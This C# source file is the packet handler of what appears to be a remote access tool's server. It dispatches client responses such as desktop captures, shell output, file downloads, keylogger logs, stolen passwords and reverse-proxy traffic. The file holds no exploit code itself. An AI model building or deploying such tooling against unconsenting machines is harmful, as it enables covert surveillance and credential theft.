using xServer.Core.Commands;
using xServer.Core.Networking;
using xServer.Core.ReverseProxy;

namespace xServer.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            if (client == null || client.Value == null)
                return;

            var type = packet.GetType();

            if (type == typeof(ClientPackets.SetStatus))
            {
                CommandHandler.HandleSetStatus(client, (ClientPackets.SetStatus)packet);
            }
            else if (type == typeof(ClientPackets.SetUserStatus))
            {
                CommandHandler.HandleSetUserStatus(client, (ClientPackets.SetUserStatus)packet);
            }
            else if (type == typeof(ClientPackets.GetDesktopResponse))
            {
                CommandHandler.HandleGetDesktopResponse(client, (ClientPackets.GetDesktopResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client,
                    (ClientPackets.GetProcessesResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetDrivesResponse))
            {
                CommandHandler.HandleGetDrivesResponse(client, (ClientPackets.GetDrivesResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetDirectoryResponse))
            {
                CommandHandler.HandleGetDirectoryResponse(client, (ClientPackets.GetDirectoryResponse)packet);
            }
            else if (type == typeof(ClientPackets.DoDownloadFileResponse))
            {
                CommandHandler.HandleDoDownloadFileResponse(client,
                    (ClientPackets.DoDownloadFileResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client,
                    (ClientPackets.GetSystemInfoResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetMonitorsResponse))
            {
                CommandHandler.HandleGetMonitorsResponse(client, (ClientPackets.GetMonitorsResponse)packet);
            }
            else if (type == typeof(ClientPackets.DoShellExecuteResponse))
            {
                CommandHandler.HandleDoShellExecuteResponse(client,
                    (ClientPackets.DoShellExecuteResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetStartupItemsResponse))
            {
                CommandHandler.HandleGetStartupItemsResponse(client,
                    (ClientPackets.GetStartupItemsResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetKeyloggerLogsResponse))
            {
                CommandHandler.HandleGetKeyloggerLogsResponse(client, (ClientPackets.GetKeyloggerLogsResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetRegistryKeysResponse))
            {
                CommandHandler.HandleLoadRegistryKey((ClientPackets.GetRegistryKeysResponse)packet, client);
            }
            else if (type == typeof(ClientPackets.GetPasswordsResponse))
            {
                CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
            }
            else if (type == typeof(ClientPackets.SetStatusFileManager))
            {
                CommandHandler.HandleSetStatusFileManager(client, (ClientPackets.SetStatusFileManager)packet);
            }
            else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                    type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                    type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
